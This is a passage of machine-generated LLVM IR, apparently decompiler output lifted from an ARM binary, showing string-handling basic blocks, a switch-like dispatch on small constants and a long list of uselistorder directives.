  %v1_9d2c = inttoptr i32 %v1_9d28 to i8*
  %v2_9d2c = call i32 @function_12c94(i8* %v1_9d2c)
  store i32 %v2_9d2c, i32* %r0.global-to-local, align 4
  %v1_9d30 = add i32 %v2_9d2c, -255
  %v2_9d30 = icmp ugt i32 %v2_9d2c, 254
  store i1 %v2_9d30, i1* %cpsr_c.global-to-local, align 1
  %v3_9d30 = sub i32 254, %v2_9d2c
  %v4_9d30 = and i32 %v3_9d30, %v2_9d2c
  %v5_9d30 = icmp slt i32 %v4_9d30, 0
  store i1 %v5_9d30, i1* %cpsr_v.global-to-local, align 1
  %v6_9d30 = icmp slt i32 %v1_9d30, 0
  store i1 %v6_9d30, i1* %cpsr_n.global-to-local, align 1
  %v7_9d30 = icmp eq i32 %v2_9d2c, 255
  store i1 %v7_9d30, i1* %cpsr_z.global-to-local, align 1
  %v8_9d34 = icmp sgt i32 %v2_9d2c, 255
  br i1 %v8_9d34, label %dec_label_pc_9884, label %dec_label_pc_9d38

dec_label_pc_9d38:                                ; preds = %dec_label_pc_9d1c
  %v0_9d38 = load i32, i32* %sb.global-to-local, align 4
  %v1_9d3c = add i32 %v0_9d38, 533
  store i32 %v1_9d3c, i32* @r4, align 4
  store i32 %v1_9d3c, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9d48 = call i32 @function_12d34(i32 %v1_9d3c, i32 255)
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9d50 = load i32, i32* %stack_var_-40, align 4
  %v0_9d54 = load i32, i32* @r5, align 4
  %v2_9d54 = add i32 %v3_9d50, 1
  %v1_9d58 = add i32 %v2_9d54, %v0_9d54
  store i32 %v1_9d58, i32* %r0.global-to-local, align 4
  %v1_9d5c = inttoptr i32 %v1_9d58 to i8*
  %v2_9d5c = call i32 @function_12c94(i8* %v1_9d5c)
  store i32 %v2_9d5c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9d60 = icmp slt i32 %v2_9d5c, 0
  store i1 %v1_9d60, i1* %cpsr_n.global-to-local, align 1
  %v2_9d60 = icmp eq i32 %v2_9d5c, 0
  store i1 %v2_9d60, i1* %cpsr_z.global-to-local, align 1
  %tmp246 = icmp slt i32 %v2_9d5c, 1
  br i1 %tmp246, label %dec_label_pc_9884, label %dec_label_pc_9d68

dec_label_pc_9d68:                                ; preds = %dec_label_pc_9d38
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9d6c = load i32, i32* %stack_var_-40, align 4
  %v0_9d70 = load i32, i32* @r5, align 4
  %v0_9d74 = load i32, i32* @r4, align 4
  store i32 %v0_9d74, i32* @r0, align 4
  %v2_9d70 = add i32 %v3_9d6c, 1
  %v1_9d78 = add i32 %v2_9d70, %v0_9d70
  store i32 %v1_9d78, i32* %r1.global-to-local, align 4
  %v2_9d7c = inttoptr i32 %v0_9d74 to i8*
  %v3_9d7c = call i32 @function_12cbc(i8* %v2_9d7c, i32 %v1_9d78)
  store i32 %v3_9d7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9884

dec_label_pc_9d84:                                ; preds = %dec_label_pc_95ec
  %v0_9d84 = load i32, i32* @r4, align 4
  %v1_9d84 = trunc i32 %v0_9d84 to i8
  %v2_9d84 = load i32, i32* @r8, align 4
  %v3_9d84 = add i32 %v2_9d84, -1452
  %v4_9d84 = inttoptr i32 %v3_9d84 to i8*
  store i8 %v1_9d84, i8* %v4_9d84, align 1
  br label %dec_label_pc_8838

dec_label_pc_9d8c:                                ; preds = %dec_label_pc_9804
  %v1_9d8c = add i32 %v0_9d8c, 1
  store i32 %v1_9d8c, i32* %ip.global-to-local, align 4
  %v2_9d90 = add i32 %v0_9804, %v1_9d8c
  store i32 %v2_9d90, i32* %r4.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v2_9d90, i32* %r0.global-to-local, align 4
  store i32 %v1_9d8c, i32* %stack_var_-40, align 4
  %v1_9da0 = inttoptr i32 %v2_9d90 to i8*
  %v2_9da0 = call i32 @function_12c94(i8* %v1_9da0)
  store i32 %v2_9da0, i32* %r0.global-to-local, align 4
  %v0_9da4 = load i32, i32* %r4.global-to-local, align 4
  %v2_9da4 = add i32 %v0_9da4, %v2_9da0
  store i32 %v2_9da4, i32* @r4, align 4
  %v1_9da8 = add i32 %v2_9da4, -1
  %v2_9da8 = inttoptr i32 %v1_9da8 to i8*
  %v3_9da8 = load i8, i8* %v2_9da8, align 1
  %v4_9da8 = zext i8 %v3_9da8 to i32
  store i32 %v4_9da8, i32* %r3.global-to-local, align 4
  %v2_9dac = icmp ugt i8 %v3_9da8, 33
  store i1 %v2_9dac, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9dac = icmp ult i8 %v3_9da8, 34
  store i1 %v6_9dac, i1* %cpsr_n.global-to-local, align 1
  %v7_9dac = icmp eq i8 %v3_9da8, 34
  store i1 %v7_9dac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9dac, label %dec_label_pc_9db4, label %dec_label_pc_9810

dec_label_pc_9db4:                                ; preds = %dec_label_pc_9d8c
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9db8 = load i32, i32* %stack_var_-40, align 4
  %v0_9dbc = load i32, i32* @r6, align 4
  %v2_9dbc = add i32 %v0_9dbc, %v3_9db8
  store i32 %v2_9dbc, i32* %r4.global-to-local, align 4
  store i32 %v2_9dbc, i32* %r0.global-to-local, align 4
  %v1_9dc4 = inttoptr i32 %v2_9dbc to i8*
  %v2_9dc4 = call i32 @function_12c94(i8* %v1_9dc4)
  store i32 %v2_9dc4, i32* %r0.global-to-local, align 4
  %v2_9dc8 = add i32 %v2_9dbc, %v2_9dc4
  store i32 %v2_9dc8, i32* @r4, align 4
  %v0_9dcc = load i32, i32* @r5, align 4
  %v1_9dcc = trunc i32 %v0_9dcc to i8
  %v3_9dcc = add i32 %v2_9dc8, -1
  %v4_9dcc = inttoptr i32 %v3_9dcc to i8*
  store i8 %v1_9dcc, i8* %v4_9dcc, align 1
  br label %dec_label_pc_9810

dec_label_pc_9dd4:                                ; preds = %dec_label_pc_9ccc, %bb243
  %v2_9dd8 = phi i32 [ %v1_9cbc, %bb243 ], [ %v2_9cdc, %dec_label_pc_9ccc ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_9dd8 = inttoptr i32 %v2_9dd8 to i8*
  store i8 0, i8* %v3_9dd8, align 1
  br label %dec_label_pc_9cf0

dec_label_pc_9de0:                                ; preds = %dec_label_pc_9878
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  %v3_9de4 = load i32, i32* %stack_var_-40, align 4
  %v0_9de8 = load i32, i32* @r5, align 4
  %v2_9de8 = add i32 %v3_9de4, 1
  %v1_9dec = add i32 %v2_9de8, %v0_9de8
  store i32 %v1_9dec, i32* %r0.global-to-local, align 4
  %v1_9df0 = inttoptr i32 %v1_9dec to i8*
  %v2_9df0 = call i32 @function_12c94(i8* %v1_9df0)
  store i32 %v2_9df0, i32* %r0.global-to-local, align 4
  %v1_9df4 = add i32 %v2_9df0, -255
  %v2_9df4 = icmp ugt i32 %v2_9df0, 254
  store i1 %v2_9df4, i1* %cpsr_c.global-to-local, align 1
  %v3_9df4 = sub i32 254, %v2_9df0
  %v4_9df4 = and i32 %v3_9df4, %v2_9df0
  %v5_9df4 = icmp slt i32 %v4_9df4, 0
  store i1 %v5_9df4, i1* %cpsr_v.global-to-local, align 1
  %v6_9df4 = icmp slt i32 %v1_9df4, 0
  store i1 %v6_9df4, i1* %cpsr_n.global-to-local, align 1
  %v7_9df4 = icmp eq i32 %v2_9df0, 255
  store i1 %v7_9df4, i1* %cpsr_z.global-to-local, align 1
  %v8_9df8 = icmp sgt i32 %v2_9df0, 255
  br i1 %v8_9df8, label %dec_label_pc_9884, label %dec_label_pc_9dfc

dec_label_pc_9dfc:                                ; preds = %dec_label_pc_9de0
  %v0_9dfc = load i32, i32* %sb.global-to-local, align 4
  %v1_9e00 = add i32 %v0_9dfc, 533
  store i32 %v1_9e00, i32* @r4, align 4
  store i32 %v1_9e00, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9e0c = call i32 @function_12d34(i32 %v1_9e00, i32 255)
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9e14 = load i32, i32* %stack_var_-40, align 4
  %v0_9e18 = load i32, i32* @r5, align 4
  %v2_9e18 = add i32 %v3_9e14, 1
  %v1_9e1c = add i32 %v2_9e18, %v0_9e18
  store i32 %v1_9e1c, i32* %r0.global-to-local, align 4
  %v1_9e20 = inttoptr i32 %v1_9e1c to i8*
  %v2_9e20 = call i32 @function_12c94(i8* %v1_9e20)
  store i32 %v2_9e20, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9e24 = icmp slt i32 %v2_9e20, 0
  store i1 %v1_9e24, i1* %cpsr_n.global-to-local, align 1
  %v2_9e24 = icmp eq i32 %v2_9e20, 0
  store i1 %v2_9e24, i1* %cpsr_z.global-to-local, align 1
  %tmp247 = icmp slt i32 %v2_9e20, 1
  br i1 %tmp247, label %dec_label_pc_9884, label %dec_label_pc_9e2c

dec_label_pc_9e2c:                                ; preds = %dec_label_pc_9dfc
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9e30 = load i32, i32* %stack_var_-40, align 4
  %v0_9e34 = load i32, i32* @r5, align 4
  %v0_9e38 = load i32, i32* @r4, align 4
  store i32 %v0_9e38, i32* @r0, align 4
  %v2_9e34 = add i32 %v3_9e30, 1
  %v1_9e3c = add i32 %v2_9e34, %v0_9e34
  store i32 %v1_9e3c, i32* %r1.global-to-local, align 4
  %v2_9e40 = inttoptr i32 %v0_9e38 to i8*
  %v3_9e40 = call i32 @function_12cbc(i8* %v2_9e40, i32 %v1_9e3c)
  store i32 %v3_9e40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9884

dec_label_pc_9e48:                                ; preds = %dec_label_pc_84c8
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9e4c = call i32 @function_1236c(i32 51)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 51, i32* %r0.global-to-local, align 4
  %v3_9e58 = call i32 @function_12288(i32 51, i32* null)
  store i32 %v3_9e58, i32* %r1.global-to-local, align 4
  %v0_9e60 = load i32, i32* @r5, align 4
  %v1_9e60 = add i32 %v0_9e60, 20
  store i32 %v1_9e60, i32* @r0, align 4
  %v2_9e64 = inttoptr i32 %v1_9e60 to i8*
  %v3_9e64 = call i32 @function_12cbc(i8* %v2_9e64, i32 %v3_9e58)
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9e6c = call i32 @function_122b4(i32 51)
  store i32 %v1_9e6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e70

dec_label_pc_9e70:                                ; preds = %dec_label_pc_84c8, %dec_label_pc_9f58, %dec_label_pc_9f2c, %dec_label_pc_9f00, %dec_label_pc_9ed4, %dec_label_pc_9e48
  %v0_9e70 = load i32, i32* @sl, align 4
  store i32 %v0_9e70, i32* %r1.global-to-local, align 4
  store i32 %v0_840c, i32* @r0, align 4
  %v2_9e78 = inttoptr i32 %v0_840c to i8*
  %v3_9e78 = call i32 @function_12cbc(i8* %v2_9e78, i32 %v0_9e70)
  store i32 %v3_9e78, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r1.global-to-local, align 4
  %v0_9e80 = load i32, i32* @r7, align 4
  %v1_9e80 = add i32 %v0_9e80, 1
  store i32 %v1_9e80, i32* @r7, align 4
  %v0_9e84 = load i32, i32* @r5, align 4
  %v2_9e88 = sub i32 %v0_839c, %v1_9e80
  %v3_9e88 = icmp uge i32 %v0_839c, %v1_9e80
  store i1 %v3_9e88, i1* %cpsr_c.global-to-local, align 1
  %v4_9e88 = xor i32 %v1_9e80, %v0_839c
  %v5_9e88 = xor i32 %v2_9e88, %v0_839c
  %v6_9e88 = and i32 %v5_9e88, %v4_9e88
  %v7_9e88 = icmp slt i32 %v6_9e88, 0
  store i1 %v7_9e88, i1* %cpsr_v.global-to-local, align 1
  %v8_9e88 = icmp slt i32 %v2_9e88, 0
  store i1 %v8_9e88, i1* %cpsr_n.global-to-local, align 1
  %v9_9e88 = icmp eq i32 %v0_839c, %v1_9e80
  store i1 %v9_9e88, i1* %cpsr_z.global-to-local, align 1
  %v1_9e8c = add i32 %v0_9e84, 3140
  store i32 %v1_9e8c, i32* @r5, align 4
  br i1 %v9_9e88, label %dec_label_pc_9e94, label %dec_label_pc_83cc

dec_label_pc_9e94:                                ; preds = %dec_label_pc_9e70
  %v1_9ea0 = add i32 %v2_83b0, 1456
  %v0_9ea8 = load i32, i32* %r8.global-to-local, align 4
  %v1_9ea8 = urem i32 %v0_9ea8, 256
  store i32 %v1_9ea8, i32* %ip.global-to-local, align 4
  %v1_9eac = add i32 %v2_83b0, 1464
  store i32 %v1_9eac, i32* %r2.global-to-local, align 4
  %v2_9eb0 = ptrtoint i32* %stack_var_-10568 to i32
  store i32 %v2_9eb0, i32* %r3.global-to-local, align 4
  store i32 %v1_9ea0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_8528.preheader

dec_label_pc_9ed4:                                ; preds = %dec_label_pc_84c8
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_9ed8 = call i32 @function_1236c(i32 47)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_9ee4 = call i32 @function_12288(i32 47, i32* null)
  store i32 %v3_9ee4, i32* %r1.global-to-local, align 4
  %v0_9eec = load i32, i32* @r5, align 4
  %v1_9eec = add i32 %v0_9eec, 20
  store i32 %v1_9eec, i32* @r0, align 4
  %v2_9ef0 = inttoptr i32 %v1_9eec to i8*
  %v3_9ef0 = call i32 @function_12cbc(i8* %v2_9ef0, i32 %v3_9ee4)
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_9ef8 = call i32 @function_122b4(i32 47)
  store i32 %v1_9ef8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e70

dec_label_pc_9f00:                                ; preds = %dec_label_pc_84c8
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_9f04 = call i32 @function_1236c(i32 48)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  %v3_9f10 = call i32 @function_12288(i32 48, i32* null)
  store i32 %v3_9f10, i32* %r1.global-to-local, align 4
  %v0_9f18 = load i32, i32* @r5, align 4
  %v1_9f18 = add i32 %v0_9f18, 20
  store i32 %v1_9f18, i32* @r0, align 4
  %v2_9f1c = inttoptr i32 %v1_9f18 to i8*
  %v3_9f1c = call i32 @function_12cbc(i8* %v2_9f1c, i32 %v3_9f10)
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_9f24 = call i32 @function_122b4(i32 48)
  store i32 %v1_9f24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e70

dec_label_pc_9f2c:                                ; preds = %dec_label_pc_84c8
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_9f30 = call i32 @function_1236c(i32 49)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 49, i32* %r0.global-to-local, align 4
  %v3_9f3c = call i32 @function_12288(i32 49, i32* null)
  store i32 %v3_9f3c, i32* %r1.global-to-local, align 4
  %v0_9f44 = load i32, i32* @r5, align 4
  %v1_9f44 = add i32 %v0_9f44, 20
  store i32 %v1_9f44, i32* @r0, align 4
  %v2_9f48 = inttoptr i32 %v1_9f44 to i8*
  %v3_9f48 = call i32 @function_12cbc(i8* %v2_9f48, i32 %v3_9f3c)
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_9f50 = call i32 @function_122b4(i32 49)
  store i32 %v1_9f50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e70

dec_label_pc_9f58:                                ; preds = %dec_label_pc_84c8
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_9f5c = call i32 @function_1236c(i32 50)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 50, i32* %r0.global-to-local, align 4
  %v3_9f68 = call i32 @function_12288(i32 50, i32* null)
  store i32 %v3_9f68, i32* %r1.global-to-local, align 4
  %v0_9f70 = load i32, i32* @r5, align 4
  %v1_9f70 = add i32 %v0_9f70, 20
  store i32 %v1_9f70, i32* @r0, align 4
  %v2_9f74 = inttoptr i32 %v1_9f70 to i8*
  %v3_9f74 = call i32 @function_12cbc(i8* %v2_9f74, i32 %v3_9f68)
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_9f7c = call i32 @function_122b4(i32 50)
  store i32 %v1_9f7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e70

; uselistorder directives
  uselistorder i32 %v2_9eb0, { 1, 0 }
  uselistorder i32 %v1_9eac, { 1, 0 }
  uselistorder i32 %v1_9ea0, { 1, 0 }
  uselistorder i32 %v1_9e8c, { 1, 0 }
  uselistorder i32 %v2_9e88, { 1, 0 }
  uselistorder i32 %v1_9e80, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v2_9df0, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_9d8c, { 1, 0, 2 }
  uselistorder i32 %v2_9d2c, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v2_9d04, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_9ce8, { 1, 0 }
  uselistorder i8 %v4_9cdc, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_9ce4, { 1, 0, 2 }
  uselistorder i1 %v7_9ccc, { 1, 0 }
  uselistorder i32 %v1_9cbc, { 1, 0, 2 }
  uselistorder i1 %v7_9cb8, { 1, 0 }
  uselistorder i1 %v9_9cb0, { 1, 0 }
  uselistorder i32 %v2_9c90, { 1, 0 }
  uselistorder i32 %v0_9c74, { 2, 0, 1, 3 }
  uselistorder i32 %v2_9c10, { 1, 0, 2 }
  uselistorder i32 %v1_9c08, { 1, 0, 2 }
  uselistorder i32 %v2_9bc0, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v2_9b94, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v3_9b18, { 5, 1, 0, 4, 3, 2, 6 }
  uselistorder i32 %v2_9afc, { 1, 0, 2 }
  uselistorder i32 %v4_9af4, { 2, 1, 0, 3 }
  uselistorder i32 %v2_9abc, { 1, 0 }
  uselistorder i32 %v1_9abc, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_9abc, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v2_9a24, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v2_99fc, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_99dc, { 1, 0 }
  uselistorder i8 %v4_99d4, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v0_99dc, { 1, 0, 3, 2 }
  uselistorder i1 %v7_99c0, { 1, 0 }
  uselistorder i32 %v1_99b0, { 1, 0, 2 }
  uselistorder i1 %v7_99ac, { 1, 0 }
  uselistorder i32 %v0_996c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_9950, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v5_986c, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v2_9840, { 1, 0 }
  uselistorder i32 %v1_9840, { 2, 0, 1, 3 }
  uselistorder i32 %v2_983c, { 3, 0, 1, 4, 2 }
  uselistorder i32 %v1_981c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_9804, { 1, 0 }
  uselistorder i32 %v0_9d8c, { 1, 0 }
  uselistorder i32 %v1_97c0, { 1, 2, 0 }
  uselistorder i32 %v5_97bc, { 0, 2, 1, 3 }
  uselistorder i32 %v0_97a8, { 1, 0 }
  uselistorder i32 %v2_979c, { 1, 0, 2 }
  uselistorder i32 %v1_9760, { 0, 2, 1 }
  uselistorder i32 %v1_9750, { 1, 0, 3, 4, 2 }
  uselistorder i32 %v1_973c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_96f8, { 1, 2, 0 }
  uselistorder i32 %v5_96f4, { 1, 8, 2, 3, 6, 7, 5, 4, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_96dc.v4_96bc, { 1, 0, 2 }
  uselistorder i32 %v1_9698, { 1, 2, 0 }
  uselistorder i32 %v4_9690, { 0, 2, 1, 3 }
  uselistorder i32 %v2_9650, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v2_9648, { 1, 2, 0 }
  uselistorder i32 %v5_963c, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v1_95c8, { 1, 2, 0 }
  uselistorder i32 %v4_95c4, { 0, 2, 1, 3 }
  uselistorder i32 %v5_95a4, { 1, 2, 3, 0 }
  uselistorder i32 %v1_958c, { 1, 2, 0 }
  uselistorder i32 %v5_9588, { 0, 2, 1, 3 }
  uselistorder i32 %v3_9570, { 1, 0 }
  uselistorder i32 %v2_9568, { 1, 2, 0 }
  uselistorder i32 %v4_9564, { 0, 2, 1, 3 }
  uselistorder i32 %v0_9528, { 2, 1, 0 }
  uselistorder i32 %v3_951c, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v3_94fc, { 4, 5, 6, 7, 3, 1, 2, 0 }
  uselistorder i32* %v2_94fc, { 1, 0 }
  uselistorder i32 %v0_94fc, { 1, 0 }
  uselistorder i32 %v3_94e4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_94d8, { 1, 2, 0 }
  uselistorder i32 %v0_94c0, { 0, 2, 1 }
  uselistorder i32 %v3_94a0, { 0, 3, 4, 2, 1, 5 }
  uselistorder i32 %storemerge73, { 1, 0 }
  uselistorder i32 %v3_9478, { 0, 3, 4, 2, 1, 5 }
  uselistorder i32 %v1_9458, { 1, 2, 0 }
  uselistorder i32 %v5_944c, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v3_9418, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v1_9410, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder i32 %v5_93e4, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v1_93c4, { 1, 0, 2 }
  uselistorder i32 %v1_93a0, { 1, 2, 0 }
  uselistorder i32 %v5_939c, { 1, 8, 7, 2, 5, 6, 4, 3, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_9384.v4_9364, { 1, 0, 2 }
  uselistorder i32 %v1_9344, { 1, 2, 0 }
  uselistorder i32 %v4_9340, { 0, 2, 1, 3 }
  uselistorder i32 %v2_92f0, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v0_92ec, { 1, 0 }
  uselistorder i32 %v0_92d4, { 1, 0 }
  uselistorder i32 %v0_92d8, { 1, 0 }
  uselistorder i32 %v2_92b4, { 1, 0 }
  uselistorder i32 %v1_92b0, { 3, 4, 2, 1, 6, 0, 7, 5, 8 }
  uselistorder i32 %v3_92ac, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 %v0_927c, { 1, 0 }
  uselistorder i1 %v7_9244, { 0, 2, 1 }
  uselistorder i32 %v1_9268, { 1, 0 }
  uselistorder i32 %v2_9264, { 1, 0 }
  uselistorder i32 %v3_9260, { 0, 1, 4, 3, 6, 2, 7, 5, 8 }
  uselistorder i32 %v2_9258, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i32 %v0_9254, { 1, 0 }
  uselistorder i32 %v1_91c4, { 1, 2, 0 }
  uselistorder i32 %v5_91c0, { 7, 6, 1, 4, 5, 3, 2, 8, 0, 10, 9, 11 }
  uselistorder i32 %v2_91a8, { 1, 0, 2 }
  uselistorder i32 %v2_91a4, { 1, 0, 2 }
  uselistorder i32 %v0_9188, { 0, 2, 1 }
  uselistorder i32 %v4_9180, { 1, 2, 0, 3 }
  uselistorder i32 %v3_915c, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_9150, { 1, 2, 0 }
  uselistorder i32 %v4_9148, { 0, 2, 1, 3 }
  uselistorder i32 %v1_90e4, { 1, 2, 0 }
  uselistorder i32 %v5_90e0, { 1, 8, 7, 2, 5, 6, 4, 3, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_90c8.v4_90a8, { 1, 0, 2 }
  uselistorder i32 %v1_9078, { 1, 2, 0 }
  uselistorder i32 %v4_9074, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8ffc, { 1, 2, 0 }
  uselistorder i32 %v5_8ff8, { 1, 8, 7, 2, 5, 6, 4, 3, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_8fe0.v4_8fc0, { 1, 0, 2 }
  uselistorder i32 %v1_8f9c, { 1, 2, 0 }
  uselistorder i32 %v4_8f94, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8f14, { 1, 2, 0 }
  uselistorder i32 %v5_8f10, { 1, 2, 8, 3, 6, 7, 5, 4, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_8ef8.v4_8ed8, { 1, 0, 2 }
  uselistorder i32 %v1_8eb8, { 1, 2, 0 }
  uselistorder i32 %v4_8eb4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8e8c, { 1, 2, 0 }
  uselistorder i32 %v4_8e88, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8e64, { 1, 2, 0 }
  uselistorder i32 %v4_8e60, { 0, 2, 1, 3 }
  uselistorder i32 %v0_9914, { 3, 7, 0, 4, 5, 6, 1, 2 }
  uselistorder i32 %v1_8e18, { 1, 2, 0 }
  uselistorder i32 %v5_8e14, { 0, 2, 1, 3 }
  uselistorder i32 %v5_8df0, { 2, 1, 0, 3, 4, 5, 6 }
  uselistorder i32 %v3_8d78, { 0, 2, 1 }
  uselistorder i32 %v2_8d6c, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v1_8d60, { 1, 0 }
  uselistorder i32 %v2_8d54, { 1, 0 }
  uselistorder i32 %v0_8d54, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_8d4c, { 1, 0 }
  uselistorder i32 %v1_8d54, { 3, 1, 4, 2, 0 }
  uselistorder i32 %v3_8d30, { 1, 0, 2 }
  uselistorder i32 %v1_8d28, { 1, 0 }
  uselistorder i32 %v2_8d10, { 1, 0 }
  uselistorder i32 %v0_8d10, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_8cec, { 4, 2, 5, 3, 1, 0, 6 }
  uselistorder i32 %v2_8c54, { 1, 0 }
  uselistorder i32 %v1_8c50, { 2, 1, 4, 0, 5, 3, 6 }
  uselistorder i32 %v3_8c4c, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i32 %v2_8af4, { 1, 0 }
  uselistorder i32 %v1_8af4, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8880, { 2, 1, 0 }
  uselistorder i32 %v3_887c, { 1, 0 }
  uselistorder i32 %v1_885c, { 1, 2, 0 }
  uselistorder i32 %v3_8858, { 4, 1, 0, 2, 6, 5, 7, 3 }
  uselistorder i32 %v2_8848, { 1, 0 }
  uselistorder i32 %v1_8840, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i1 %v7_8830, { 1, 0 }
  uselistorder i1 %v7_8828, { 1, 0 }
  uselistorder i32 %v1_880c, { 2, 1, 0 }
  uselistorder i32 %v3_8808, { 1, 0 }
  uselistorder i32 %v0_880c, { 1, 0 }
  uselistorder i32 %v2_87dc, { 1, 0 }
  uselistorder i32 %v1_87dc, { 1, 2, 4, 0, 3, 5 }
  uselistorder i32 %v0_87dc, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v2_87d8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_87c4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8784, { 1, 0 }
  uselistorder i32 %v2_877c, { 1, 0 }
  uselistorder i32 %v1_8770, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v2_875c, { 1, 0 }
  uselistorder i32 %v0_875c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_8754, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_875c, { 3, 1, 4, 2, 0 }
  uselistorder i32 %v3_8744, { 1, 0 }
  uselistorder i32 %v3_8738, { 1, 0, 2 }
  uselistorder i32 %v0_86f4, { 1, 0, 2 }
  uselistorder i32 %v1_8698, { 1, 2, 0 }
  uselistorder i32 %v3_8694, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v1_8670, { 1, 2, 0 }
  uselistorder i32 %v3_8664, { 0, 2, 1, 3 }
  uselistorder i32 %v4_8650, { 1, 0 }
  uselistorder i8 %v3_8650, { 16, 17, 18, 19, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_8650, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8900, { 3, 4, 5, 1, 2, 0, 8, 7, 6 }
  uselistorder i32 %v2_8640, { 1, 0 }
  uselistorder i32 %v1_8634, { 2, 0, 3, 1, 4 }
  uselistorder i1 %v7_8610, { 1, 0 }
  uselistorder i32 %v1_8610, { 1, 0 }
  uselistorder i1 %v7_8608, { 1, 0 }
  uselistorder i32 %v4_85ec, { 1, 0, 2 }
  uselistorder i1 %v7_85e8, { 1, 0 }
  uselistorder i32 %v4_85cc, { 1, 0, 2 }
  uselistorder i1 %v7_85c8, { 1, 0 }
  uselistorder i1 %v7_85c0, { 1, 0 }
  uselistorder i1 %v7_85b8, { 1, 0 }
